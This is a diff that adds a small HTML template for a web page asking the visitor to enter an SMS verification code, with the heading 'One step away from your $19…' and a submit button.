@@ -1,0 +1,30 @@
+
+
+<div class="bg-g1 size1 flex-w flex-col-c-sb p-l-15 p-r-15">
+
+    <div class="flex-col-c w-full p-t-56">
+        <p class="txt-center l1-txt2 p-b-32 wsize1 ">One step away from your $19…</p>
+
+
+		<!--<div class="error"></div>-->
+		<form class="flex-w flex-c-m w-full contact100-form validate-form">
+        <!--<form class="flex-w flex-c-m w-full contact100-form"> -->
+            <div class="wrap-input100 validate-input where1 p-b-12" data-validate="Please enter a valid code!">
+			 <!--<div class="wrap-input100 validate-input where1 p-b-12">-->
+                <input class="s1-txt3 placeholder0 input100" type="number" id="pin" name="pin" placeholder="Code received by SMS"
+                       maxlength="10" value="">
+            </div>
+
+			<p class="txt-left l1-txt2 p-b-100 wsize2" name="title-with-number" id="title-with-number">Insert your code from SMS we’ve sent you to  </p>
+			<script>document.getElementById("title-with-number").textContent += number</script>
+            <button class="flex-c-m s1-txt4 size3 how-btn trans-04 where1" onclick="return validate($('#title-with-number'))">
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Let's go&nbsp;&nbsp;&nbsp;<span
+                    style="font-size: 24px;color:white">&rarr;</span>
+            </button>
+
+        </form>
+    </div>
+
+</div>
+<!--===============================================================================================-->
+<script src="{{ url_for('static', filename='js/main.js')}}"></script>
